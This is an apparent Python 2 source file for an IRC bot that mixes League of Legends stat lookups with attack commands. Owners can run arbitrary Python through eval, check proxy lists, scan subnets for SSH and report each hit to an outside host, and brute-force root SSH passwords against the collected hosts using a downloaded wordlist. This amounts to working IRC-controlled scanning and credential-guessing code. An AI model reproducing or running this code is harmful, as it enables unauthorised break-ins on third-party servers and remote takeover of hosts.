# -*- coding: utf-8 -*-

import sys
import socket
import urllib2

from connection import Connection
from threading import Thread

from lolclean.lolclean import LOLClean
import paramiko

class Bot:
	END_OF_MOTDS = ['376', '422']
	PREFIX = 'v'
	TAG = '(vayne)'

	OWNERS = ['segfault']

	def __init__(self, nick):
		self.__connections = []
		self.__buffers = []
		self.__channels = []
		self.__threads = {}
		self.__vnc = {}
		self.__key = 0
		self.__nick = nick
		self.__lol = LOLClean('1201f800-aced-4abb-9083-714dcf58a36e')

	def add_connection(self, sv, port):
		con = Connection(sv, port)
		self.__connections.append(con)
		self.__buffers.append('')

	def set_channels(self, channels):
		self.__channels = channels

	def connect(self):
		for con in self.__connections:
			if con.active:
				continue
			con.connect(self.__nick)
		self.work()
	
	@property
	def currcon(self):
		return self.__connections[self.__key]

	def printayne(self, msg, targets=None):
		self.currcon.msg('{0} ~ {1}'.format(self.TAG, msg), targets)

	def parse(self, data):
		print(data)
		source = ''
		line = ''
		if data.startswith(':'):
			source, line = data[1:].split(' ', 1)
		else:
			source = None
			p = data.split(' ')
			if p[0] == 'PING':
				self.currcon.write(('PONG', p[1]))
				print("PONG")
				return

		if ' :' in line:
			argstr, text = line.split(' :', 1)
		else:
			argstr, text = line, ''
		args = argstr.split(' ')

		if args[0] in self.END_OF_MOTDS:
			for channel in self.__channels:
				self.currcon.write(('JOIN', channel))
			return

		if text:
			if (text[0] == self.PREFIX or text.split(' ')[0] == self.__nick) and len(text.split(' ')) >= 2:
				self.parse_cmd(text, source, args[1] if args[1][0] == '#' else source.split('!')[0])

	def check_args(self, args, req, place):
		if len(args) < req:
			self.printayne('?', [place])
			return False
		return True

	def check_owner(self, source, place):
		if source in self.OWNERS:
			return True
		self.printayne('who the fuck are you?', [place])
		return False

	def add_jobs(self, key, jobs):
		if key not in self.__threads:
			self.__threads[key] = []
		for job in jobs:
			self.__threads[key].append(job)

	def pop_job(self, key):
		if len(self.__threads[key]) > 1:
			self.__threads[key].pop()
		else:
			self.__threads.pop(key, None)

	def job_running(self, key):
		if key not in self.__threads:
			return False
		return True

	def lolit(self):
		return LeagueOfLegends(self.RIOT_API_KEY)

	def parse_cmd(self, cmd, source, place):
		args = cmd.split(' ') 
		#pop to remove the prefix
		args.pop(0)

		if len(args) < 1:
			return

		cmd = args.pop(0)
		source = source.split('!')[0]
		print cmd
		print args

		if (cmd == 'power'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			self.OWNERS.append(args[0])
			self.printayne('now {0} has full power'.format(args[0]), place)

		if (cmd == 'nick'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			self.__nick = args[0]
			self.currcon.write(('NICK', args[0]))

		if (cmd == 'join'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return
			self.currcon.write(('JOIN', args[0]))
			self.__channels.append(args[0])

		if (cmd == 'jobs'):
			ct = 0
			jobs = ''
			for k, v in self.__threads.iteritems():
				l = len(v)
				ct += l
				jobs += '{0}[{1}] '.format(k, l)
			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), [place])

		if (cmd == 'stop'):
			if not self.check_args(args, 1, place):
				return
			if args[0] == 'all':
				self.__threads.clear()
				return
			if args[0] in self.__threads:
				self.__threads.pop(args[0], None)

		if (cmd == 'py'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return
			try:
				ret = eval(' '.join(args))
				self.printayne(ret, [place])
			except Exception as e:
				self.printayne(e, [place])

		if (cmd == 'proxy'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			t = Thread(target=self.proxy, args=(args[0], place,))
			self.add_jobs('proxy', [t])
			t.start()
			self.printayne('checking for proxies in {0}'.format(args[0]), [place])

		if (cmd == 'ssh'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			t = Thread(target=self.ssh, args=(args[0], place,))
			self.add_jobs('ssh', [t])
			t.start()
			self.printayne('scanning for ssh in subnet {0}'.format(args[0]), [place])

		if (cmd == 'bssh'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			t = Thread(target=self.bssh, args=(args[0], place,))
			self.add_jobs('bssh', [t])
			t.start()
			self.printayne('bruteforcing ssh {0}'.format(args[0]), [place])

		if (cmd == 'summoner'):
			if not self.check_args(args, 2, place):
				return

			lol = self.lolit()
			lol.set_api_region(args[1])

			try:
				data = lol.get_summoner_by_name(args[0])
				s_name = data.iterkeys().next()
				s_data = data[s_name]
				s_id = s_data['id']
				s_level = s_data['summonerLevel']
				self.printayne('{0} => id {1} # level {2}'.format(s_name, s_id, s_level), [place])
			except RiotError, e:
				self.printayne('riot error => {0}'.format(e.error_msg), [place])

		if (cmd == 'rank'):
			if not self.check_args(args, 2, place):
				return
			fine, output = self.__lol.rank(args[0], args[1])
			if fine:
				for line in output:
					self.printayne(line, [place])
			else:
				self.printayne(output, [place])

		if (cmd == 'last'):
			if not self.check_args(args, 2, place):
				return
			fine, output = self.__lol.last(args[0], args[1])
			self.printayne(output, [place])

	def is_bad_proxy(self, pip):
		try:
			proxy_handler = urllib2.ProxyHandler({'http': pip})
			opener = urllib2.build_opener(proxy_handler)
			opener.addheaders = [('User-agent', 'Mozilla/5.0')]
			urllib2.install_opener(opener)
			req=urllib2.Request('http://www.google.com')
			sock=urllib2.urlopen(req)
		except urllib2.HTTPError, e:
			return True
		except Exception, detail:
			return True
		return False

	def proxy(self, url, place):
		socket.setdefaulttimeout(5)
		try:
			web_file = urllib2.urlopen(url)
			for p in web_file:
				if not self.job_running('proxy'):
					return
				if not self.is_bad_proxy(p.strip('\n')):
					self.printayne('proxy {0} ONLINE'.format(p), [place])

		except Exception, e:
			self.printayne(e, [place])
			self.printayne('error downloading your proxy list file', [place])
			return

	def ssh_u(self, target):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(3)
			sock.connect((target, 22))
			return True
		except Exception, e:
			return False

	def ssh(self, net, place):
		for i in xrange(1, 256):
			if not self.job_running('ssh'):
				return
			target = '{0}.{1}'.format(net, i)
			if self.ssh_u(target):
				urllib2.urlopen('{0}{1}'.format('http://www.huelol.com/ssh/check/', target))
				self.printayne('ssh {0}'.format(target), [place])
		self.pop_job('ssh')

	def bssh_u(self, ssh, target, key):
		try:
			ssh.connect(target, username='root', password=key)
			return True
		except Exception, e:
			return False

	def bssh_r(self, target, keys, place):
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		for k in keys:
			if not self.job_running('bssh'):
				return
			if self.bssh_u(ssh, target, k.strip('\r\n')):
				self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, k), [place])
		self.pop_job('bssh')

	def bssh(self, url, place):
		try:
			web_file = urllib2.urlopen('http://www.huelol.com/ssh/all')
			sshs = web_file.readlines()
			web_file = urllib2.urlopen(url)
			keys = web_file.readlines()
			self.printayne('collected {0} running SSHs # wordlist contains {1} keys'.format(len(sshs), len(keys)), [place])
			for ssh in sshs:
				self.printayne('bssh now bruting {0}'.format(ssh), [place])
				ts = []
				for i in range(4):
					t = Thread(target=self.bssh_r, args=(ssh.strip('\r\n'), keys[i*5:i*5+5], place,))
					self.add_jobs('bssh', [t])
					t.start()
					ts.append(t)
				for t in ts:
					t.join()
		except Exception, e:
			self.printayne(e, [place])
			self.printayne('error downloading ssh list file', [place])


	def work(self):
		while True:
			for key, con in enumerate(self.__connections):
				self.__buffers[self.__key] += con.socket.recv(1024)
				temp = self.__buffers[self.__key].split('\n')
				self.__buffers[self.__key] = temp.pop()
				
				for line in temp:
					clean = line.rstrip()
					self.__key = key
					self.parse(clean)

if __name__ == '__main__':
	bot = Bot('PIKACHU')
	#bot.add_connection('google.root-network.org', 6667)
	bot.add_connection(sys.argv[1], 6667)
	channels = ['#{0}'.format(x) for x in sys.argv[2:]]
	bot.set_channels(channels)
	bot.connect()
